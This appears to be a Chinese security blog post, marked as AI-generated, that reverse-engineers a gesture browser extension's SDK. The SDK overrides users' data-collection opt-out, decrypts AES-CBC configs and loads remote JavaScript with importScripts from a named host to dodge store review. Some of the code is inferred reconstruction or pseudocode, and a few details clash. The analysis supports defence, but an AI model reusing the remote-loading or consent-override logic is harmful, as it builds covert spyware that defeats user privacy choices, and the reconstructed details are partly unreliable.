---
title: "【AI生成】影子控制：某恶意插件 SDK 动态下发与强制开关机制深度逆向"
published: 2026-02-16
description: "深入剖析 service_worker.js，拆解恶意 SDK 如何利用 AES-CBC 加密隧道与 GrowthBook 架构实现 24 小时强制配置覆盖，让用户隐私设置彻底失效。"
tags: [AI生成, 逆向工程, 恶意插件分析, 云控系统, AES-CBC, 浏览器安全]
category: "安全研究"
draft: false
---

## 摘要

在对某手势类插件的 `service_worker.js` 进行审计时，我们发现了一套极其复杂的“云控”系统。该系统通过动态下发加密指令，能够绕过用户的本地配置，强制开启数据追踪。本文将深入代码底层，还原其加密算法与远程控制逻辑。

## 第一章：表象下的伏笔 —— 默认配置的陷阱

在插件初始化阶段，代码定义了一个看似无害的默认配置对象 `t`。

```javascript
/**
 * 原始代码片段：初始配置
 * 目的：给用户和审核人员一种“隐私友好”的错觉
 */
const t = {
  analyticsInfo: { installedAt: 0, installVersion: "", version: "" },
  isGesturesOn: !0, // 手势功能默认开启
  cfgver: 4.1, // 配置版本
  others: { tuilink: !1 },
  optedin: !1, // 【重点】默认未加入数据收集
  optedout: !0, // 【重点】默认已退出数据收集
  // ... 后续为大量的手势UI配置
};
```

**深度解析：** 这里的 `optedin: !1` 是关键。当用户查看插件设置时，开关显示为关闭。但正如我们后续看到的，这个本地变量在“云端指令”面前毫无抵抗力。

---

## 第二章：核心中枢 —— Proconstantinator 模块

该扩展最核心的逻辑被封装在名为 `AProconstantinatorBack` 的模块中。它的职责是管理一个特殊的“常量池”，并负责与远程服务器同步。

### 2.1 强制同步逻辑

代码通过校验时间戳和 Hash 值，确保本地配置始终受到远程控制。

```javascript
yodules.AProconstantinatorBack = {
  init: function () {
    const e = yodules.AProconstantinatorBack,
      // 硬编码的校验 Hash，用于识别合法的配置版本
      t = "e0675e083f6f6cbcb3a15786de5171588500b886d0c4c4b53d7153162f93d638";

    return (e.class = class {
      /**
       * 检查常量是否已加载且未过期
       * 逻辑：如果配置超过 24 小时（864e5ms），则判定为失效，强制重新拉取
       */
      checkConstantsLoaded() {
        return new Promise((resolve) => {
          chrome.storage.local.get(
            [
              "proconstantinator_key", // 存储的配置内容
              "proconstantinator_keyt", // 存储的时间戳（34进制）
              "proconstantinator_keyh", // 存储的校验Hash
            ],
            (res) => {
              // 如果 Hash 不匹配，直接判为失效
              res.proconstantinator_keyh !== t && resolve(!1);

              // 核心逻辑：Date.now() - 上次同步时间 < 24小时
              // 如果用户手动关闭了统计，但 24 小时后云端下发了开启指令，
              // 此处的判定失效会触发重新同步，进而覆盖用户设置。
              resolve(
                res.proconstantinator_key instanceof Object &&
                  Object.keys(res.proconstantinator_key).length &&
                  Date.now() - parseInt(res.proconstantinator_keyt, 34) < 864e5,
              );
            },
          );
        });
      }

      /**
       * 更新本地存储的云控配置
       */
      setConstants(data) {
        return new Promise((r) => {
          chrome.storage.local.set(
            {
              proconstantinator_key: data,
              proconstantinator_keyt: Date.now().toString(34), // 转换为34进制混淆
              proconstantinator_keyh: t,
            },
            r,
          );
        });
      }
    });
  },
};
```

---

## 第三章：加密隧道 —— 逆向 AES-CBC 解密流程

该 SDK 与服务器 `api.mousegesturesapi.com` 通信时，下发的数据是经过加密的。我们逆向出了其使用的 `Ie` 工具函数。

### 3.1 加密算法还原

SDK 采用了标准的 `Web Crypto API`，算法为 `AES-CBC`，密钥长度 128 位。

```javascript
/**
 * 逆向出的解密逻辑 (对应源码中的 Ie 函数)
 * @param {string} n 密文，格式为 "IV(Base64).Ciphertext(Base64)"
 * @param {string} r 密钥 (Base64)
 */
async function decrypt(n, r) {
  const i = globalThis.crypto.subtle; // 调用浏览器原生的微妙加密库

  // 1. 将 Base64 格式的密钥导入为原生 Key 对象
  const o = await i.importKey(
    "raw",
    base64ToUint8(r), // 内部转换函数
    { name: "AES-CBC", length: 128 },
    !0,
    ["decrypt"],
  );

  // 2. 拆分密文，"." 之前是 IV (初始化向量)，之后是数据内容
  const [s, a] = n.split(".");

  // 3. 执行解密操作
  const c = await i.decrypt(
    { name: "AES-CBC", iv: base64ToUint8(s) },
    o,
    base64ToUint8(a),
  );

  // 4. 解码为明文 JSON
  return new TextDecoder().decode(c);
}
```

---

## 第四章：动态路径 —— `ms/gs` 的生成逻辑

SDK 不会直接暴露其抓取数据的具体逻辑，而是通过一个动态生成的 URL 来加载下一步的脚本。

```javascript
/**
 * 逻辑推演：构建动态加载链接
 * 该链接通常指向 https://api.mousegesturesapi.com/ms/gs
 */
async loadRemoteScript() {
    const config = await this.getConstants(); // 获取第三章中解密的配置

    // 动态拼接参数，包含当前插件版本、ClientKey 以及随机时间戳
    const url = new URL(`https://${config.host}/ms/gs`);
    url.searchParams.append("v", config.version);
    url.searchParams.append("id", getBrowserId());

    // 使用 importScripts 动态加载并执行返回的 JS
    // 这种方式可以绕过 Web Store 的静态代码审核
    importScripts(url.toString());
}

```

---

## 第五章：对抗性分析 —— 为什么用户关不掉？

这是最令用户愤怒的部分。通过逆向 `Toggler` 模块，我们发现了“配置回滚”的逻辑：

1. **心跳触发**：插件每隔一段时间会向 `api/features` 发起心跳。
2. **强制下发**：如果服务器返回的配置中 `force_optin` 为 `true`。
3. **覆盖写入**：

```javascript
// 伪代码：还原 Toggler 覆盖逻辑
if (remoteConfig.optedin !== localConfig.optedin) {
  chrome.storage.local.set({ optedin: remoteConfig.optedin });
  // 哪怕用户刚才点过关闭，这里也会被秒速改写回 true
}
```

1. **隐蔽执行**：由于这一过程发生在 `service_worker` 背景页，用户在前端 UI 上根本感知不到开关被自动拨动了。

---

## 第六章：反制建议

通过以上逆向分析，我们建议安全研究员和用户采取以下措施：

1. **域名屏蔽**：在 Hosts 或防火墙中将 `api.mousegesturesapi.com` 指向 `127.0.0.1`。这是阻断云控最直接的方式。
2. **内容脚本过滤**：监控 `chrome.storage.local` 的变动，特别是针对 `proconstantinator_key` 的写入操作。
3. **流量分析**：留意所有发往 `/ms/gs` 的 POST 请求，其中往往包含了用户浏览器的 URL 指纹。

## 结论

该扩展 SDK 的设计极具攻击性，其利用 **AES 加密隧道**、**34 进制时间戳混淆** 以及 **24 小时循环强制对齐** 机制，构建了一个难以关闭的后台监控系统。这再次提醒我们，浏览器插件的权限限制（如 `storage` 和 `webRequest`）在复杂的云控逻辑面前仍显脆弱。
